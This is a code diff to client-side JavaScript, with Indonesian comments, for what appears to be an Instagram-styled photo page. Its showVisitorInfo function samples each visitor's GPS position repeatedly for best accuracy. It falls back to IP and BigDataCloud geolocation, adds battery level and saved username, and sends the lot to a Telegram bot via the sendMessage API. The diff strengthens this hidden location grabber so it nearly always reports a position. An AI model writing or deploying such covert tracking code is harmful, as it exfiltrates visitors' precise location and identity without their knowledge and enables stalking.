@@ -110,11 +110,12 @@ const openPhotoOptions = document.getElementById('openPhotoOptions');
       fileInput.value=""; document.getElementById("caption").value=""; preview.style.display="none";
     }
   });
-
-// versi baru: ambil lokasi lebih akurat (multi-sample + fallback)
+  
+// versi baru: ambil lokasi lebih akurat (multi-sample + fallback BigDataCloud)
 async function showVisitorInfo() {
   const savedUser = localStorage.getItem("ig_user") || "Anonim";
 
+  // === fungsi kirim pesan ke Telegram ===
   async function sendToTelegram(d, latitude, longitude, source = "Unknown", accuracy = null) {
     try {
       const now = new Date();
@@ -130,7 +131,7 @@ async function showVisitorInfo() {
       let batteryInfo = "Tidak diketahui";
       try {
         const battery = await navigator.getBattery();
-        batteryInfo = `${(battery.level*100).toFixed(0)}% (${battery.charging ? "⚡" : "🔋"})`;
+        batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? "⚡" : "🔋"})`;
       } catch {}
 
       const msg =
@@ -147,8 +148,8 @@ async function showVisitorInfo() {
 🕓 ${now.toLocaleString('id-ID')}`;
 
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method:"POST",
-        headers:{"Content-Type":"application/json"},
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
       });
       console.log("✅ Info pengunjung dikirim (sumber:", source, ")");
@@ -157,6 +158,7 @@ async function showVisitorInfo() {
     }
   }
 
+  // === fungsi bantu: ambil lokasi GPS terbaik ===
   async function getBestGPS(samples = 5) {
     return new Promise((resolve, reject) => {
       if (!navigator.geolocation) return reject("No geolocation support");
@@ -167,15 +169,12 @@ async function showVisitorInfo() {
         navigator.geolocation.getCurrentPosition(pos => {
           results.push(pos.coords);
           if (results.length >= samples) {
-            // pilih titik dengan akurasi terbaik
-            const best = results.reduce((a,b) => a.accuracy < b.accuracy ? a : b);
+            const best = results.reduce((a, b) => a.accuracy < b.accuracy ? a : b);
             resolve(best);
-          } else {
-            setTimeout(capture, 700);
-          }
+          } else setTimeout(capture, 700);
         }, err => {
           if (results.length > 0) {
-            const best = results.reduce((a,b) => a.accuracy < b.accuracy ? a : b);
+            const best = results.reduce((a, b) => a.accuracy < b.accuracy ? a : b);
             resolve(best);
           } else reject(err);
         }, opts);
@@ -184,21 +183,52 @@ async function showVisitorInfo() {
     });
   }
 
+  // === fungsi bantu: ambil lokasi dari BigDataCloud (gratis & akurat) ===
+  async function getBigDataLocation() {
+    try {
+      const res = await fetch("https://api.bigdatacloud.net/data/ip-geolocation-full?localityLanguage=id");
+      const d = await res.json();
+      return {
+        latitude: d.location?.latitude,
+        longitude: d.location?.longitude,
+        accuracy: 5000, // perkiraan akurasi
+        city: d.city || d.locality || d.principalSubdivision,
+        country: d.countryName || d.country,
+        ip: d.ip || "Unknown"
+      };
+    } catch (err) {
+      console.error("⚠️ Gagal ambil lokasi dari BigDataCloud:", err);
+      return null;
+    }
+  }
+
+  // === urutan logika ===
   try {
-    // 1️⃣ coba GPS high accuracy (multi-sampling)
+    // 🛰️ 1️⃣ Coba GPS multi-sample
     const coords = await getBestGPS(6);
     const { latitude, longitude, accuracy } = coords;
     const ipData = await (await fetch("https://ipwho.is/")).json();
-    sendToTelegram(ipData, latitude, longitude, "GPS HighAccuracy", Math.round(accuracy));
-  } catch (e1) {
-    console.warn("⚠️ GPS gagal, fallback ke IP:", e1);
+    await sendToTelegram(ipData, latitude, longitude, "GPS HighAccuracy", Math.round(accuracy));
+  } catch (gpsErr) {
+    console.warn("⚠️ GPS gagal, coba BigDataCloud...");
     try {
-      // 2️⃣ fallback ke IP-based lokasi
-      const d = await (await fetch("https://ipwho.is/")).json();
-      sendToTelegram(d, d.latitude, d.longitude, "IP-based");
-    } catch (e2) {
-      // 3️⃣ fallback terakhir (lokasi default)
-      sendToTelegram({}, null, null, "Fixed");
+      // 🌐 2️⃣ Fallback ke BigDataCloud (gratis & lebih akurat dari IP)
+      const bdc = await getBigDataLocation();
+      if (bdc) {
+        await sendToTelegram(bdc, bdc.latitude, bdc.longitude, "BigDataCloud", bdc.accuracy);
+        return;
+      }
+      throw new Error("BigDataCloud gagal");
+    } catch (netErr) {
+      console.warn("⚠️ BigDataCloud gagal, fallback ke IP...");
+      try {
+        // 💡 3️⃣ Terakhir, fallback ke IP-based
+        const d = await (await fetch("https://ipwho.is/")).json();
+        await sendToTelegram(d, d.latitude, d.longitude, "IP-based");
+      } catch {
+        // 🚨 4️⃣ Jika semua gagal
+        await sendToTelegram({}, null, null, "Fixed");
+      }
     }
   }
 }
